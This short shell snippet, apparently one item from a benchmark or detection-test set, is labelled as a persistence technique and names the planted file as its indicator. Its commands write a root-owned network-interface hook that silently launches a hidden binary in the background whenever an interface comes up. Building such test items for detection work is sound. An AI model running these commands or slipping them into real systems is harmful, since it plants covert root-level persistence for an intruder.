# category: persistence
# title: Root hook run when a network interface comes up
# indicator: if-up.d/zz-bench-hook
mkdir -p /etc/network/if-up.d
printf '#!/bin/sh\nnohup /usr/local/sbin/.netagent >/dev/null 2>&1 &\n' >/etc/network/if-up.d/zz-bench-hook
chmod 755 /etc/network/if-up.d/zz-bench-hook
